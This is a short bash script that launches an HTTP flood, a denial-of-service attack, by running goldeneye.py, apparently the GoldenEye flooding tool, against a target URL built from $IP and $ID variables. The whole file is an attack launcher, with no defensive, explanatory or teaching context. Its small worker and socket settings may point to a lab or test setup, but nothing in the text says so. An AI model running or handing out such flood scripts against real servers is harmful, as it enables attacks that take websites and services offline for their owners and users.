#!/bin/bash

echo "Executing HTTP Flood ..."
flood () {
  python3 ./goldeneye.py "http://$IP?action=get&id=$ID" -w 1 -s 1
}

flood